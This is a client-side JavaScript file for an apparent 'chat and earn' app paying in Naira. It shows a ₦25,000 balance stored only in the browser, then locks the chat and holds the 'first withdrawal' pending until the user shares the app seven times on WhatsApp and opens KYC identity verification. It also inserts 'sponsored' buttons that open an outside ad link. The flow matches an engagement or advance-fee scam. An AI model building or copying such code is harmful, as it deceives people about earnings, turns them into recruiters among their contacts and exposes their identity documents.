(()=>{'use strict';

const FIRST_WITHDRAWAL_MINIMUM=25000;
const REQUIRED_SHARE_ACTIONS=7;
const $=id=>document.getElementById(id);
const money=n=>`₦${Number(n||0).toLocaleString('en-NG')}`;
let firstChatRedirected=false;
let gateOpen=false;
let lastScreen='';

function stateEntry(){
  const keys=Object.keys(localStorage).filter(key=>key.startsWith('ce-state-')&&key!=='ce-state-guest');
  for(const key of keys.reverse()){
    try{return{key,state:JSON.parse(localStorage.getItem(key)||'{}')}}catch{}
  }
  return null;
}
function writeState(entry){
  if(!entry?.key)return;
  localStorage.setItem(entry.key,JSON.stringify(entry.state));
}
function activeScreen(){return document.querySelector('.screen.active')?.id||''}
function closeById(id){$(id)?.remove()}

function showFirstWithdrawalGate(){
  if(gateOpen||$('firstWithdrawalGate'))return;
  gateOpen=true;
  const modal=document.createElement('div');
  modal.id='firstWithdrawalGate';
  modal.style.cssText='position:fixed;inset:0;z-index:100000;background:rgba(0,0,0,.9);display:grid;place-items:center;padding:20px;backdrop-filter:blur(8px)';
  modal.innerHTML=`<div style="width:min(100%,390px);background:#171b18;border:2px solid #00E676;border-radius:20px;padding:22px;text-align:center;box-shadow:0 18px 50px rgba(0,200,83,.25)"><div style="font-size:44px">🎉</div><h2 style="margin:8px 0;color:#00E676">Your First Withdrawal Is Ready</h2><p style="color:#b8c2bc;font-size:14px;line-height:1.65;text-align:left">You have reached <b style="color:#fff">${money(FIRST_WITHDRAWAL_MINIMUM)}</b>. To unlock new earnings, place your first withdrawal, complete the required sharing stage, and open KYC verification. Your request remains pending until reviewed.</p><button id="placeFirstWithdrawal" style="width:100%;padding:15px;border:0;border-radius:12px;background:#00C853;color:#001b0b;font-size:16px;font-weight:950;margin-top:12px">PLACE MINIMUM WITHDRAWAL NOW →</button><button id="viewFirstBalance" style="width:100%;padding:12px;border:1px solid #39413b;border-radius:10px;background:#1d221e;color:#fff;font-weight:900;margin-top:8px">VIEW BALANCE</button></div>`;
  document.body.appendChild(modal);
  $('placeFirstWithdrawal').onclick=()=>{closeById('firstWithdrawalGate');gateOpen=false;window.goScreen?.('withdraw')};
  $('viewFirstBalance').onclick=()=>{closeById('firstWithdrawalGate');gateOpen=false;window.goScreen?.('earnings')};
}

function enforceFirstWithdrawal(){
  const entry=stateEntry();if(!entry)return;
  const s=entry.state||{};
  const available=Number(s.availableBalance??s.totalBalance??0);
  const paymentReady=s.paymentStatus==='pending_review'||s.paymentStatus==='approved';
  const input=$('chatInput');

  if(!s.withdrawal&&available>=FIRST_WITHDRAWAL_MINIMUM){
    if(input){input.disabled=true;input.placeholder='Place your first withdrawal to continue';}
    if(activeScreen()==='chat')showFirstWithdrawalGate();
  }else if(s.withdrawal&&!paymentReady){
    if(input){input.disabled=true;input.placeholder='Complete sharing and KYC to continue';}
  }else if(input){
    input.disabled=false;input.placeholder='Type a message...';
  }
}

function enhanceUnlockCard(){
  const entry=stateEntry();if(!entry)return;
  const s=entry.state||{};
  const available=Number(s.availableBalance??s.totalBalance??0);
  if(s.withdrawal||available<FIRST_WITHDRAWAL_MINIMUM)return;
  const body=$('chatBody');if(!body)return;
  let card=body.querySelector('[data-advanced-withdrawal]');
  if(!card){card=document.createElement('div');card.dataset.advancedWithdrawal='1';body.appendChild(card)}
  card.style.cssText='margin:18px 0;padding:22px 18px;border-radius:18px;background:rgba(0,200,83,.12);border:2px solid rgba(0,230,118,.55);text-align:center';
  card.innerHTML=`<div style="font-size:34px;margin-bottom:8px">🎉</div><b style="display:block;color:#00E676;font-size:21px">First Withdrawal Unlocked</b><p style="color:#b8c2bc;font-size:13px;margin:7px 0 14px;line-height:1.55">You reached ${money(FIRST_WITHDRAWAL_MINIMUM)}. Place your first withdrawal, complete sharing, and open KYC verification before new earnings unlock.</p><button style="width:100%;padding:15px 20px;border:0;border-radius:12px;background:#00C853;color:#001b0b;font-size:16px;font-weight:950">PLACE MINIMUM WITHDRAWAL NOW →</button>`;
  card.querySelector('button').onclick=()=>window.goScreen?.('withdraw');
}

function mountMemberHub(){
  const dashboard=$('dashboard');if(!dashboard)return;
  const host=dashboard.querySelector('.bonus-banner');if(!host)return;
  const entry=stateEntry();if(!entry)return;
  const s=entry.state||{};
  let hub=$('memberHubAdvanced');
  if(!hub){hub=document.createElement('div');hub.id='memberHubAdvanced';host.after(hub)}
  const status=!s.withdrawal?'Not started':s.paymentStatus==='pending_review'?'Under review':'Requirements in progress';
  hub.style.cssText='margin:0 16px 16px;padding:16px;border-radius:16px;background:#171b18;border:1px solid #303832';
  hub.innerHTML=`<div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start;margin-bottom:12px"><div><div style="font-size:10px;color:#88948d;letter-spacing:1px">MEMBER HOME</div><b style="font-size:18px">${String(s.name||'User').replace(/[<>]/g,'')}</b></div><div style="text-align:right"><div style="font-size:10px;color:#88948d">WITHDRAWAL</div><b style="color:#00E676">${status}</b></div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px"><button data-action="chat" style="padding:12px;border:0;border-radius:10px;background:#00C853;font-weight:900">CONTINUE CHAT</button><button data-action="earnings" style="padding:12px;border:1px solid #39413b;border-radius:10px;background:#1d221e;color:#fff;font-weight:900">EARNINGS</button><button data-action="withdrawal" style="padding:12px;border:1px solid #39413b;border-radius:10px;background:#1d221e;color:#fff;font-weight:900">WITHDRAWAL / STATUS</button><button data-action="profile" style="padding:12px;border:1px solid #39413b;border-radius:10px;background:#1d221e;color:#fff;font-weight:900">PROFILE</button></div>`;
  hub.querySelector('[data-action="chat"]').onclick=()=>window.continueLastChat?.();
  hub.querySelector('[data-action="earnings"]').onclick=()=>window.goScreen?.('earnings');
  hub.querySelector('[data-action="withdrawal"]').onclick=()=>{
    if(s.withdrawal)window.goScreen?.(s.paymentStatus==='pending_review'?'processing':Number(s.sharing?.count||0)<REQUIRED_SHARE_ACTIONS?'sharewall':'kyc');
    else window.goScreen?.(Number(s.availableBalance||0)>=FIRST_WITHDRAWAL_MINIMUM?'withdraw':'earnings');
  };
  hub.querySelector('[data-action="profile"]').onclick=()=>showProfile(s);
}

function showProfile(s){
  closeById('profileHubModal');
  const modal=document.createElement('div');modal.id='profileHubModal';modal.style.cssText='position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.82);display:grid;place-items:center;padding:20px';
  const status=!s.withdrawal?'Not started':String(s.paymentStatus||'in progress').replaceAll('_',' ');
  modal.innerHTML=`<div style="width:min(100%,380px);background:#171b18;border:1px solid #303832;border-radius:18px;padding:20px"><h3 style="margin:0 0 12px">Profile</h3><div style="color:#b8c2bc;font-size:13px;line-height:1.8"><b style="color:#fff">Name:</b> ${String(s.name||'User').replace(/[<>]/g,'')}<br><b style="color:#fff">Balance:</b> ${money(s.availableBalance||0)}<br><b style="color:#fff">Activity Points:</b> ${Number(s.activityPoints||0)}<br><b style="color:#fff">Withdrawal:</b> ${status}</div><button style="width:100%;margin-top:16px;padding:12px;border:0;border-radius:10px;background:#00C853;font-weight:900">CLOSE</button></div>`;
  modal.querySelector('button').onclick=()=>modal.remove();document.body.appendChild(modal);
}

function shareRulesAccepted(){
  const entry=stateEntry();
  return Boolean(entry?.state?.shareRulesAccepted===true);
}

function markShareRulesAccepted(){
  const entry=stateEntry();if(!entry)return;
  entry.state.shareRulesAccepted=true;
  writeState(entry);
}

function configureShareRules(){
  document.querySelector('.share-rules-note')?.remove();
  document.querySelector('.share-rules-back')?.remove();
  if(window.__memberShareRulesConfigured)return;
  const originalShare=window.__chatEarnOriginalShare||window.doShareWA;
  if(typeof originalShare!=='function')return;
  window.__memberShareRulesConfigured=true;

  window.doShareWA=()=>{
    if(shareRulesAccepted()){
      originalShare();
      return;
    }
    $('shareRulesModal')?.classList.add('show');
  };

  window.continueShareRules=()=>{
    markShareRulesAccepted();
    $('shareRulesModal')?.classList.remove('show');
  };
}

function showRulesAfterWithdrawal(){
  const entry=stateEntry();if(!entry)return;
  const s=entry.state||{};
  if(activeScreen()!=='sharewall'||!s.withdrawal||s.shareRulesAccepted===true)return;
  setTimeout(()=>$('shareRulesModal')?.classList.add('show'),120);
}

function mountJourneyAd(screenId){
  if(!['dashboard','earnings','withdraw','sharewall','kyc','processing'].includes(screenId))return;
  const screen=$(screenId);if(!screen||screen.querySelector('[data-member-sponsored]'))return;
  const card=document.createElement('div');card.dataset.memberSponsored='1';
  card.style.cssText='margin:16px;padding:14px;border-radius:14px;background:#171b18;border:1px solid #303832';
  card.innerHTML='<div style="font-size:10px;color:#88948d;letter-spacing:1px;margin-bottom:5px">SPONSORED · OPTIONAL</div><b style="font-size:14px">Featured member activity</b><p style="font-size:11px;color:#aebbb3;line-height:1.5;margin:5px 0 10px">Open the current optional activity without losing your saved progress.</p><button style="width:100%;padding:11px;border:0;border-radius:10px;background:#00C853;font-weight:900">OPEN OPTIONAL ACTIVITY →</button>';
  card.querySelector('button').onclick=()=>window.open('https://omg10.com/4/11279843','_blank','noopener,noreferrer');
  screen.appendChild(card);
}

function redirectFirstChatThroughDashboard(){
  const screen=activeScreen();
  if(screen==='chat'&&!firstChatRedirected){
    const entry=stateEntry();const s=entry?.state||{};
    const totalTurns=Object.values(s.partnerTurns||{}).reduce((a,b)=>a+Number(b||0),0);
    if(totalTurns===0&&!s.withdrawal){
      firstChatRedirected=true;
      const partnerName=s.lastPartner;
      window.goScreen?.('dashboard');
      setTimeout(()=>{
        const cards=[...document.querySelectorAll('#foreignerList .foreigner-card')];
        const index=Math.max(0,cards.findIndex(card=>card.textContent.includes(partnerName||'')));
        window.openChat?.(index,true);
      },900);
    }
  }
}

function upgradeProcessingReturn(){
  if(activeScreen()!=='processing')return;
  const button=$('processingActions')?.querySelector('button');if(!button||button.dataset.memberReturn)return;
  button.dataset.memberReturn='1';button.textContent='RETURN TO MEMBER HOME';
  button.onclick=()=>{window.goScreen?.('dashboard');setTimeout(mountMemberHub,0)};
}

function tick(){
  const screen=activeScreen();
  configureShareRules();
  redirectFirstChatThroughDashboard();
  enforceFirstWithdrawal();
  if(screen==='chat')enhanceUnlockCard();
  if(screen==='dashboard')mountMemberHub();
  showRulesAfterWithdrawal();
  mountJourneyAd(screen);
  upgradeProcessingReturn();
  if(screen!==lastScreen)lastScreen=screen;
}

setInterval(tick,350);
document.addEventListener('DOMContentLoaded',tick,{once:true});
})();